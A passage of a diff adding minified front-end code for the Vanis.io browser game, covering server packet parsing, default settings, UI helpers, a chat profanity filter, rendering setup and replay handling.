+                    let o = a.plugins.extract.canvas(n),
+                        l = document.createElement("canvas");
+                    l.width = e, l.height = t;
+                    let c = l.getContext("2d");
+                    c.beginPath(), c.rect(0, 0, e, t), c.fillStyle = "#" + r.backgroundColor, c.fill(), c.drawImage(o, 0, 0, e, t);
+                    let h = l.toDataURL();
+                    return i.destroy(!0), h
+                }
+                setTagId(e) {
+                    return e || (e = null), e !== this.tagId && (this.tagId = e, !0)
+                }
+                getMassText(e) {
+                    return !r.shortMass || e < 1e3 ? e.toFixed(0) : (e / 1e3).toFixed(1) + "k"
+                }
+                shouldAutoRespawn(e) {
+                    return !this.app.showMenu && (e ? r.mbAutorespawn : r.autoRespawn)
+                }
+                triggerDeathDelay(e) {
+                    if (clearTimeout(this.deathTimeout), delete this.deathTimeout, e ? delete this.dual.autoRespawning : (y.deathDelay = !1, y.autoRespawning = !1), !r.mbAutorespawn && !r.autoRespawn) {
+                        let t = [];
+                        t.push(`Kills: ${this.killCount}`), t.push(`Time alive: ${this.timeAlive.toString().toHHMMSS()}`), t.push(`Highscore: ${this.highestScore.toString().replace(/\B(?=(\d{3})+(?!\d))/g,",")}`), $(".bar").innerHTML = t.join("<br>"), this.killCount = 0, this.timeAlive = 0
+                    }
+                }
+                triggerAutoRespawn(e) {
+                    if (e) {
+                        let {
+                            dual: t
+                        } = this;
+                        t.autoRespawning = !1, t.spawn()
+                    } else y.deathDelay = !1, y.autoRespawning = !1, this.actions.join()
+                }
+                handleDeath(e, t) {
+                    //console.log("RIP");
+                    console.log(t);
+                    e.readUInt16LE(), this.killCount += e.readUInt16LE(), e.readUInt32LE(), t || (y.deathDelay = !0);
+                    let {
+                        dual: s
+                    } = this;
+                    this.shouldAutoRespawn(t) ? t ? (s.autoRespawning = !0, s.ticksSinceDeath = 0) : (y.autoRespawning = !0, this.ticksSinceDeath = 0) : this.deathTimeout = setTimeout(this.triggerDeathDelay.bind(this, t), 900), s.updateOutlines()
+                }
+                parseLeaderboard(e) {
+                    let t = [];
+                    for (;;) {
+                        let s = e.readUInt16LE();
+                        if (0 == s) {
+                            this.events.$emit("leaderboard-update", t);
+                            return
+                        }
+                        let i = this.playerManager.getPlayer(s);
+                        if (!i) continue;
+                        let a = {
+                            pid: s,
+                            position: t.length + 1,
+                            text: i.name,
+                            color: i.perk_colorCss || "#ffffff",
+                            bold: !!i.perk_color
+                        };
+                        t.push(a)
+                    }
+                }
+                parseScrimmageLeaderboard(e) {
+                    let t = [];
+                    for (;;) {
+                        let s = e.readUInt8();
+                        if (0 == s) break;
+                        let i = {};
+                        if (1 & s && (i.position = e.readUInt8()), 2 & s && (i.pid = e.readUInt16LE()), 4 & s) i.text = e.readEscapedString(), i.color = "#ffffff";
+                        else {
+                            let a = 2 & s && this.playerManager.getPlayer(i.pid);
+                            i.text = a ? a.name : "n/a", i.color = a && a.perk_colorCss || "#ffffff"
+                        }
+                        8 & s && (i.score = e.readEscapedString()), 16 & s && (i.color = "#" + ("00" + e.readUInt8().toString(16)).slice(-2) + ("00" + e.readUInt8().toString(16)).slice(-2) + ("00" + e.readUInt8().toString(16)).slice(-2)), 32 & s && (i.bold = !0), 64 & s && (i.link = e.readEscapedString()), t.push(i)
+                    }
+                    let n = null;
+                    if (e.offset !== e.length) {
+                        let o = e.readEscapedString();
+                        n = {
+                            visible: 0 != o.length,
+                            text: o
+                        }
+                    }
+                    this.events.$emit("leaderboard-update", t, n)
+                }
+                parseMinimap(e) {
+                    let t = [];
+                    for (;;) {
+                        let s = e.readUInt16LE();
+                        if (0 == s) {
+                            this.events.$emit("minimap-positions", t);
+                            return
+                        }
+                        e.offset++;
+                        let i = e.readUInt8(),
+                            a = e.readUInt8();
+                        t.push({
+                            pid: s,
+                            x: i / 255,
+                            y: a / 255
+                        })
+                    }
+                }
+                parsePlayers(e) {
+                    let t = JSON.parse(e.readEscapedString()),
+                        s = t.find(e => e.pid === this.playerId),
+                        i = s && this.setTagId(s.tagId),
+                        {
+                            playerManager: a
+                        } = this,
+                        n = [];
+                    for (let o of t) {
+                        let r = a.setPlayerData(o);
+                        n.push(r)
+                    }
+                    i && (this.events.$emit("minimap-positions", []), a.invalidateVisibility(n))
+                }
+                parseMessage(e) {
+                    let t = e.readUInt8();
+                    switch (t) {
+                        case 1: {
+                            let s = d(e);
+                            this.initialDataPacket = e.view, this.start(s);
+                            return
+                        }
+                        case 2: {
+                            let i = new Uint8Array(e.buffer, 1);
+                            this.connection.sendJoinData(new a(i).build(), !1);
+                            return
+                        }
+                        case 3: {
+                            let o = performance.now() - this.pingStamp;
+                            this.updateStats(Math.round(o));
+                            return
+                        }
+                        case 4: {
+                            let {
+                                playerManager: r
+                            } = this;
+                            for (;;) {
+                                let l = e.readUInt16LE();
+                                if (0 == l) return;
+                                r.delayedRemovePlayer(l)
+                            }
+                        }
+                        case 6:
+                            this.connection.sendOpcode(6);
+                            return;
+                        case 7: {
+                            let c = e.readUInt8(),
+                                h, p;
+                            if (1 & c) {
+                                let u = e.readUInt16LE();
+                                p = this.playerManager.getPlayer(u)
+                            }
+                            if (2 & c) {
+                                let g = e.readUInt16LE();
+                                h = this.playerManager.getPlayer(g)
+                            }
+                            h && h.setCrown(!1), p && p.setCrown(!0);
+                            return
+                        }
+                        case 8:
+                            if (this.multiboxPid) return;
+                            this.multiboxPid = e.readUInt16LE();
+                            return;
+                        case 9: {
+                            let {
+                                playerManager: A
+                            } = this, m = this.activePid;
+                            m && A.getPlayer(m).setOutline(16777215), m = this.activePid = e.readUInt16LE(), A.getPlayer(m).setOutline(16711935);
+                            return
+                        }
+                        case 10: {
+                            this.timeStamp = performance.now();
+                            let v = e.packetId || (e.packetId = this.ws.packetCount++);
+                            this.parseCells(e, v), this.updateStates(!0);
+                            let w = this.alive;
+                            w && (this.spectating = !1);
+                            let {
+                                dual: I
+                            } = this, {
+                                replay: k
+                            } = this;
+                            w && !this.replaying ? k.add(e.view, !1) : I.alive || k.clear(!1), !w && y.autoRespawning && 37 == ++this.ticksSinceDeath && this.triggerAutoRespawn(!1), this.serverTick++, this.playerManager.sweepRemovedPlayers(), I.focused || this.updateCamera(!0);
+                            return
+                        }
+                        case 11:
+                            this.parseLeaderboard(e);
+                            return;
+                        case 12:
+                            this.parseMinimap(e);
+                            return;
+                        case 13: {
+                            let b = {
+                                pid: e.readUInt16LE(),
+                                text: e.readEscapedString()
+                            };
+                            if (0 == b.pid) {
+                                let {
+                                    selectedServer: _
+                                } = y;
+                                _ && /Welcome to Vanis\.io,.+\!/.test(b.text) && (b.text = `Connected to ${_.region} ${_.name}`), this.events.$emit("chat-message", b.text);
+                                return
+                            }
+                            let S = this.playerManager.getPlayer(b.pid);
+                            if (!S) return;
+                            b.from = S.name;
+                            let {
+                                perk_colorCss: E
+                            } = S;
+                            E && (b.fromColor = E), this.events.$emit("chat-message", b);
+                            return
+                        }
+                        case 14: {
+                            let x = e.readUInt8(),
+                                B = {};
+                            if (2 & x) {
+                                let Q = e.readUInt8();
+                                typeId > 0 && typeId < 4 && (B.type = ({
+                                    1: "success",
+                                    2: "error",
+                                    3: "warning",
+                                    4: "info"
+                                })[Q])
+                            }
+                            4 & x && (B.timer = e.readUInt16LE());
+                            let M = e.readEscapedString();
+                            B.title = f(M), n.toast.fire(B);
+                            return
+                        }
+                        case 15: {
+                            let {
+                                playerManager: T
+                            } = this;
+                            for (;;) {
+                                let D = e.readUInt16LE();
+                                if (0 === D) return;
+                                let L = e.readString16(),
+                                    N = e.readEscapedString(),
+                                    U = {
+                                        pid: D,
+                                        nickname: L,
+                                        skinUrl: N
+                                    };
+                                T.setPlayerData(U)
+                            }
+                        }
+                        case 16:
+                            this.parsePlayers(e);
+                            return;
+                        case 17:
+                            C.camera.sx = e.readInt16LE(), C.camera.sy = e.readInt16LE();
+                            return;
+                        case 18: {
+                            let {
+                                replay: R
+                            } = this;
+                            R.clear(!1), this.clearCells();
+                            return
+                        }
+                        case 19: {
+                            let P = 0 !== e.readUInt8();
+                            if (this.events.$emit("xp-update", e.readUInt32LE()), !P) return;
+                            let F = e.readUInt16LE(),
+                                G = atob("WW91IGhhdmUgcmVhY2hlZCBsZXZlbA==");
+                            n.toast.fire({
+                                background: "#b58b00",
+                                title: `${G} ${F}!`,
+                                type: "success",
+                                timer: 4e3
+                            });
+                            return
+                        }
+                        case 20:
+                            this.handleDeath(e, !1);
+                            return;
+                        case 21:
+                        case 27:
+                            return;
+                        case 22:
+                            if (!window.grecaptcha) return void alert("Captcha library is not loaded");
+                            this.events.$emit("show-image-captcha");
+                            return;
+                        case 23:
+                            y.spectators = e.readUInt16LE();
+                            return;
+                        case 24:
+                            this.serverTick = e.readUInt32LE(), this.events.$emit("restart-timing-changed", e.readUInt32LE());
+                            return;
+                        case 25:
+                            this.events.$emit("update-cautions", {
+                                custom: e.readEscapedString()
+                            });
+                            return;
+                        case 26:
+                            y.playButtonDisabled = !!e.readUInt8(), e.length > e.offset + 1 && (y.playButtonText = e.readEscapedString() || "Play");
+                            return;
+                        case 28:
+                            C.parseScrimmageLeaderboard(e);
+                            return
+                    }
+                }
+            }
+            e.exports = C = window.GAME = new k
+        }, , , function(e) {
+            var t = {
+                useWebGL: !0,
+                gameResolution: 1,
+                smallTextThreshold: 40,
+                autoZoom: !1,
+                rememeberEjecting: !0,
+                autoRespawn: !1,
+                mouseFreezeSoft: !0,
+                drawDelay: 120,
+                switchDistance:8,
+                cameraMoveDelay: 150,
+                cameraZoomDelay: 150,
+                cameraZoomSpeed: 10,
+                replayDuration: 8,
+                showReplaySaved: 2,
+                showNames: 2,
+                showMass: 2,
+                showSkins: 1,
+                showOwnName: !0,
+                showOwnMass: !0,
+                showOwnSkin: !0,
+                showCrown: !0,
+                foodVisible: !0,
+                eatAnimation: !0,
+                showHud: !0,
+                showLeaderboard: !0,
+                showServerName: !1,
+                showChat: !0,
+                showChatToast: !1,
+                minimapEnabled: !0,
+                minimapLocations: !0,
+                showFPS: !0,
+                showPing: !0,
+                showCellCount: !0,
+                showPlayerScore: !1,
+                showPlayerMass: !0,
+                showClock: !1,
+                showSessionTime: !1,
+                showPlayerCount: !1,
+                showSpectators: !1,
+                showRestartTiming: !1,
+                showBlockedMessageCount: !0,
+                filterChatMessages: !0,
+                clearChatMessages: !0,
+                backgroundColor: "101010",
+                borderColor: "000000",
+                foodColor: "ffffff",
+                ejectedColor: "ffa500",
+                cellNameOutlineColor: "000000",
+                cursorImageUrl: null,
+                backgroundImageUrl: "img/background.png",
+                virusImageUrl: "img/virus.png",
+                cellMassColor: "ffffff",
+                cellMassOutlineColor: "000000",
+                cellNameFont: "Hind Madurai",
+                cellNameWeight: 1,
+                cellNameOutline: 2,
+                cellNameSmoothOutline: !0,
+                cellLongNameThreshold: 750,
+                cellMassFont: "Ubuntu",
+                cellMassWeight: 2,
+                cellMassOutline: 2,
+                cellMassTextSize: 0,
+                cellMassSmoothOutline: !0,
+                shortMass: !0,
+                showBackgroundImage: !0,
+                backgroundImageRepeat: !0,
+                backgroundDefaultIfUnequal: !0,
+                backgroundImageOpacity: .6,
+                useFoodColor: !1,
+                namesEnabled: !0,
+                skinsEnabled: !0,
+                massEnabled: !0,
+                showLocations: !1,
+                cellBorderSize: 1,
+                autoHideReplayControls: !1,
+                minimapSize: 220,
+                minimapFPS: 30,
+                minimapSmoothing: .08,
+                mbColor: "ff3bb7",
+                mbSkin: "",
+                mbActive: 1,
+                mbAutorespawn: !1,
+                gameAlpha: 1,
+                mbName: "",
+                mbUseName: !1,
+                debugStats: !0,
+                clientStats: !0,
+                playerStats: !0,
+                showCellLines: !1,
+                showTag: !1,
+                showDir: !1,
+                chatColorOnlyPeople: !1,
+                mbArrow: "https://i.postimg.cc/6pvLJ2TW/image.png"
+            };
+
+            function s(e) {
+                switch (e) {
+                    case 2:
+                        return "bold";
+                    case 0:
+                        return "thin";
+                    default:
+                        return "normal"
+                }
+            }
+
+            function i(e, t) {
+                var s;
+                switch (e) {
+                    case 3:
+                        s = t / 5;
+                        break;
+                    case 1:
+                        s = t / 20;
+                        break;
+                    default:
+                        s = t / 10
+                }
+                return Math.ceil(s)
+            }
+            e.exports = window.settings = new class {
+                constructor() {
+                    this.getInternalSettings(), this.userDefinedSettings = this.loadUserDefinedSettings(), Object.assign(this, t, this.userDefinedSettings), this.set("skinsEnabled", !0), this.set("namesEnabled", !0), this.set("massEnabled", !0), this.compileNameFontStyle(), this.compileMassFontStyle()
+                }
+                getInternalSettings() {
+                    this.cellSize = 512
+                }
+                compileNameFontStyle() {
+                    var e = {
+                        fontFamily: this.cellNameFont,
+                        fontSize: 80,
+                        fontWeight: s(this.cellNameWeight)
+                    };
+                    return this.cellNameOutline && (e.stroke = PIXI.utils.string2hex(this.cellNameOutlineColor), e.strokeThickness = i(this.cellNameOutline, e.fontSize), e.lineJoin = this.cellNameSmoothOutline ? "round" : "miter"), this.nameTextStyle = e
+                }
+                compileMassFontStyle() {
+                    var e = {
+                        fontFamily: this.cellMassFont,
+                        fontSize: 56 + 20 * this.cellMassTextSize,
+                        fontWeight: s(this.cellMassWeight),
+                        lineJoin: "round",
+                        fill: PIXI.utils.string2hex(this.cellMassColor)
+                    };
+                    return this.cellMassOutline && (e.stroke = PIXI.utils.string2hex(this.cellMassOutlineColor), e.strokeThickness = i(this.cellMassOutline, e.fontSize), e.lineJoin = this.cellMassSmoothOutline ? "round" : "miter"), this.massTextStyle = e
+                }
+                loadUserDefinedSettings() {
+                    if (!localStorage.settings) return {};
+                    try {
+                        return JSON.parse(localStorage.settings)
+                    } catch (e) {
+                        return {}
+                    }
+                }
+                getDefault(e) {
+                    return t[e]
+                }
+                set(e, t) {
+                    return this[e] !== t && (this[e] = t, this.userDefinedSettings[e] = t, localStorage.settings = JSON.stringify(this.userDefinedSettings), !0)
+                }
+            }
+        }, function(e, t, s) {
+            var i = s(270).default,
+                a = i.mixin({
+                    toast: !0,
+                    position: "top",
+                    showConfirmButton: !1,
+                    showCloseButton: !0
+                });
+            window.Swal = i, window.SwalAlerts = e.exports = {
+                toast: a,
+                alert: function(e) {
+                    i.fire({
+                        text: e,
+                        confirmButtonText: "OK"
+                    })
+                },
+                confirm: function(e, t, s) {
+                    i.fire({
+                        text: e,
+                        showCancelButton: !0,
+                        confirmButtonText: "Continue"
+                    }).then(e => {
+                        e.value ? t() : s && s()
+                    })
+                },
+                instance: i
+            }
+        }, , , function(e, t, s) {
+            let i = s(4),
+                a = !1;
+            e.exports = {
+                lerp: (e, t, s) => e + (t - e) * s,
+                clampNumber: (e, t, s) => Math.min(s, Math.max(t, e)),
+                getTimeString: function(e, t, s) {
+                    e instanceof Date && (e = e.getTime());
+                    var i = t ? 1 : 1e3,
+                        a = 60 * i,
+                        n = 60 * a;
+                    if (e < i) return "1 second";
+                    for (var o = [24 * n, n, a, i], r = ["day", "hour", "minute", "second"], l = !1, c = [], h = 0; h < o.length; h++) {
+                        var d = o[h],
+                            p = Math.floor(e / d);
+                        if (p) {
+                            var u = r[h],
+                                g = p > 1 ? "s" : "";
+                            c.push(p + " " + u + g), e %= d
+                        }
+                        if (l) break;
+                        p && !s && (l = !0)
+                    }
+                    return c.join(", ")
+                },
+                encodeHTML: e => e.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/'/g, "&apos;").replace(/"/g, "&quot;"),
+                getTimestamp() {
+                    let e = new Date,
+                        t = e.getFullYear(),
+                        s = e.getMonth() + 1,
+                        i = e.getDate(),
+                        a = [t, (s > 9 ? "" : "0") + s, (i > 9 ? "" : "0") + i].join(""),
+                        n = [("0" + e.getHours()).slice(-2), ("0" + e.getMinutes()).slice(-2), ("0" + e.getSeconds()).slice(-2)].join("");
+                    return a + "-" + n
+                },
+                loadImage: e => fetch(e, {
+                    mode: "cors"
+                }).then(e => e.blob()).then(e => createImageBitmap(e)),
+                hideCaptchaBadge() {
+                    a || (document.body.classList.add("hide-captcha-badge"), a = !0)
+                },
+                destroyPixiPlugins(e) {
+                    ["interaction", "accessibility"].forEach(t => {
+                        let s = e.plugins[t];
+                        s && (s.destroy(), delete e.plugins[t])
+                    })
+                },
+                writeUserData(e, t) {
+                    let s = t && i.mbUseName ? i.mbName || "Dual" : document.getElementById("nickname").value,
+                        a = t ? i.mbSkin || "vanis1" : document.getElementById("skinurl").value,
+                        n = document.getElementById("teamtag").value;
+                    e.writeEscapedStringNT(s), e.writeEscapedStringNT(a), e.writeEscapedStringNT(n)
+                }
+            }
+        }, , , , function(e, t, s) {
+            let i = s(4);
+            class a {
+                constructor() {
+                    this.cache = new Map, this.textureSize = i.cellSize, this.cellSize = this.textureSize / 2
+                }
+                destroyCache() {
+                    let {
+                        cache: e
+                    } = this;
+                    e.forEach(e => e.destroy(!0)), e.clear()
+                }
+            }
+            let n = s(24),
+                o = s(124);
+            e.exports = {
+                cells: new class e extends a {
+                    getTexture(e) {
+                        let {
+                            cache: t
+                        } = this;
+                        if (t.has(e)) return t.get(e);
+                        {
+                            let {
+                                cellSize: s,
+                                textureSize: i
+                            } = this, a = new PIXI.Graphics().beginFill(e).drawCircle(0, 0, s).endFill();
+                            a.position.set(s);
+                            let o = PIXI.RenderTexture.create(i, i);
+                            return t.set(e, o), n.render(a, o), o
+                        }
+                    }
+                },
+                squares: new class e extends a {
+                    getTexture(e) {
+                        let {
+                            cache: t
+                        } = this;
+                        if (t.has(e)) return t.get(e);
+                        {
+                            let {
+                                cellSize: s,
+                                textureSize: i
+                            } = this, a = new PIXI.Graphics().beginFill(e).drawRect(-s, -s, 2 * s, 2 * s).endFill();
+                            a.position.set(s);
+                            let o = PIXI.RenderTexture.create(i, i);
+                            return t.set(e, o), n.render(a, o), o
+                        }
+                    }
+                },
+                virus: o
+            }
+        }, , function(e, t, s) {
+            let i = s(1),
+                a = s(4),
+                {
+                    cells: n
+                } = s(12),
+                {
+                    clampNumber: o
+                } = s(8);
+            class r {
+                constructor({
+                    id: e,
+                    x: t,
+                    y: s,
+                    size: i,
+                    flags: a,
+                    texture: o,
+                    context: r
+                }) {
+                    o = o || n.getTexture(0), this.flags = a, this.oSize = this.size = i, this.destroyed = !1, this.id = e || 0;
+                    let l = this.sprite = new PIXI.Sprite(this.texture = o);
+                    l.anchor.set(.5), l.gameData = this, this.x = this.ox = l.position.x = t, this.y = this.oy = this.sprite.position.y = s, this.mainContext = r, this.activeContexts = 1
+                }
+                update() {
+                    
+                    let e = i.timeStamp - this.updateStamp,
+                        t = o(e / a.drawDelay, 0, 1);
+                    if (this.destroyed && (1 === t || this.texture.clearedFromCache)) return !0;
+                    let s = 2 * (this.size = t * (this.nSize - this.oSize) + this.oSize),
+                        {
+                            sprite: n
+                        } = this;
+                    if (!n) return !0;
+                    n.width = n.height = s;
+                    let {
+                        position: r
+                    } = n;
+                    return r.x = this.x = t * this.newPositionScale * (this.nx - this.ox) + this.ox, r.y = this.y = t * this.newPositionScale * (this.ny - this.oy) + this.oy, this.onUpdate && this.onUpdate(), !1
+                }
+                destroy(e, t = !1) {
+                    if (this.destroyed) return !1;
+                    let {
+                        dual: s
+                    } = i, {
+                        cells: a
+                    } = 1 & e ? i : s, {
+                        id: n
+                    } = this;
+                    if (a.delete(n), s.opened) {
+                        let o = this.mainContext,
+                            r = --this.activeContexts;
+                        if (o == e) {
+                            let {
+                                cells: l
+                            } = 2 & e ? i : s;
+                            if (l.has(n)) return this.mainContext = 1 & e ? 2 : 1, !1
+                        }
+                        if (0 != r) return !1
+                    }
+                    return this.onDestroy && this.onDestroy(), this.pid && i.ownedCells.delete(this), this.destroyed = !0, t ? i.destroyedCells.push(this) : this.destroySprite(), !0
+                }
+                destroySprite() {
+                    this.sprite && (this.sprite.destroy(), this.sprite = null)
+                }
+            }
+            r.prototype.type = 0, r.prototype.updateStamp = 0, r.prototype.newPositionScale = 1, e.exports = r
+        }, , , function(e, t, s) {
+            var i = s(5);
+
+            function a() {
+                i.instance.fire({
+                    type: "warning",
+                    title: "Browser support limited",
+                    html: "Skins might not work properly in this browser.<br>Please consider using Chrome.",
+                    allowOutsideClick: !1
+                })
+            }
+
+            function n(e) {
+                for (var t = "", s = 0; s < e.length; s++) t += String.fromCharCode(e.charCodeAt(s) - 2);
+                return t
+            }
+            var o = ["pkiigt", "p3iigt", "pkii5t", "pkiic", "p3iic", "p3ii6", "pkii", "p3ii", "p3i", "hciiqv", "h6iiqv", "hcii2v", "hci", "cpcn", "cuujqng", "ewpv", "rwuu{", "xcikpc", "xci3pc", "eqem", "e2em", "uewo", "ycpm", "yjqtg", "yj2tg", "unwv", "dkvej", "d3vej", "rqtp", "r2tp", "tcrg", "t6rg", "jkvngt", "j3vngt", "jkvn5t", "j3vn5t", "pc|k", "p6|k", "tgvctf", "ejkpm", "hwem", "ujkv"],
+                r = o.map(n),
+                l = o.map(n).sort((e, t) => t.length - e.length).map(e => RegExp("[^s]*" + e.split("").join("s*") + "[^s]*", "gi"));
+            e.exports = {
+                noop: function() {},
+                checkBadWords: function(e) {
+                    return e = e.toLowerCase(), r.some(t => e.includes(t))
+                },
+                replaceBadWordsChat: function(e) {
+                    for (var t = 0; t < l.length; t++) e = e.replace(l[t], e => Array(e.length).fill("*").join(""));
+                    return e
+                },
+                notifyUnsupportedBrowser: async function() {
+                    window.safari || /^((?!chrome|android).)*safari/i.test(navigator.userAgent) ? i.instance.fire({
+                        type: "warning",
+                        title: "Safari browser is not supported :(",
+                        html: "Please consider using Google Chrome.",
+                        allowOutsideClick: !1,
+                        showCloseButton: !1,
+                        showCancelButton: !1,
+                        showConfirmButton: !1
+                    }) : !localStorage.skipUnsupportedAlert && ((localStorage.skipUnsupportedAlert = !0, navigator.userAgent.toLowerCase().includes("edge")) ? a() : await new Promise(e => {
+                        var t = new Image;
+                        t.src = "data:image/webp;base64,UklGRjoAAABXRUJQVlA4IC4AAACyAgCdASoCAAIALmk0mk0iIiIiIgBoSygABc6WWgAA/veff/0PP8bA//LwYAAA", t.onload = t.onerror = () => {
+                            e(2 === t.height)
+                        }
+                    }) || a())
+                },
+                isFirstVisit: !localStorage.visitedBefore && (localStorage.visitedBefore = !0, !0)
+            }
+        }, , , , , , , function(e, t, s) {
+            var i = s(4),
+                a = s(8);
+            PIXI.utils.skipHello();
+            var n = document.getElementById("canvas"),
+                o = {
+                    resolution: i.customResolution || window.devicePixelRatio || 1,
+                    view: n,
+                    forceCanvas: !i.useWebGL,
+                    antialias: !1,
+                    powerPreference: "high-performance",
+                    backgroundColor: PIXI.utils.string2hex(i.backgroundColor)
+                };
+            o.resolution = i.gameResolution;
+            var r = PIXI.autoDetectRenderer(o);
+
+            function l() {
+                r.resize(window.innerWidth, window.innerHeight)
+            }
+            l(), a.destroyPixiPlugins(r), window.addEventListener("resize", l), r.clear(), e.exports = r
+        }, function(e) {
+            function t() {
+                this.data = []
+            }
+            e.exports = t, t.prototype.write = function() {
+                return new Uint8Array(this.data)
+            }, t.prototype.uint8 = function(e) {
+                this.data.push(e)
+            }, t.prototype.uint8Array = function(e) {
+                for (var t = 0; t < e.length; t++) this.data.push(e[t])
+            }, t.prototype.utf8 = function(e) {
+                e = unescape(encodeURIComponent(e));
+                for (var t = 0; t < e.length; t++) this.data.push(e.charCodeAt(t));
+                this.data.push(0)
+            }
+        }, , , , function(e, t, s) {
+            var i = s(2),
+                a = s(167);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            "use strict";
+            var i = s(31),
+                a = s.n(i);
+            t.default = a.a
+        }, function(e) {
+            e.exports = {
+                data: () => ({})
+            }
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(169);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(171);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(173);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(175);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(177);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(179);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            "use strict";
+            var i = s(39),
+                a = s.n(i);
+            t.default = a.a
+        }, function(e, t, s) {
+            var i = s(89),
+                a = s(1),
+                n = s(5),
+                o = a.replay.database;
+            e.exports = {
+                props: ["replay"],
+                methods: {
+                    async play(e) {
+                        if (!a.connection.opened || await new Promise(e => {
+                                n.confirm("You will be disconnected", () => e(!0), () => e(!1))
+                            })) try {
+                            a.replay.play(e)
+                        } catch (t) {
+                            console.log(t), a.stop(), n.alert("Waching replays on extension currently does not work, please watch them without extension or render them!")
+                        }
+                    },
+                    downloadReplay(e) {
+                        n.instance.fire({
+                            input: "text",
+                            inputValue: e.name,
+                            showCancelButton: !0,
+                            confirmButtonText: "Download",
+                            html: "Only Vanis.io can read replay files.<br>It consists of player positions and other game related data."
+                        }).then(t => {
+                            var s = t.value;
+                            if (s) {
+                                var a = new Blob([e.data], {
+                                    type: "text/plain;charset=utf-8"
+                                });
+                                i.saveAs(a, s + ".vanis")
+                            }
+                        })
+                    },
+                    deleteReplay(e) {
+                        n.confirm("Are you sure that you want to delete this replay?", () => {
+                            o.removeItem(e, () => {
+                                a.events.$emit("replay-removed")
+                            })
+                        })
+                    }
+                }
+            }
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(219);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(221);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(223);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(225);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(227);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(231);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(233);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(235);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(237);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(239);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(241);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(243);
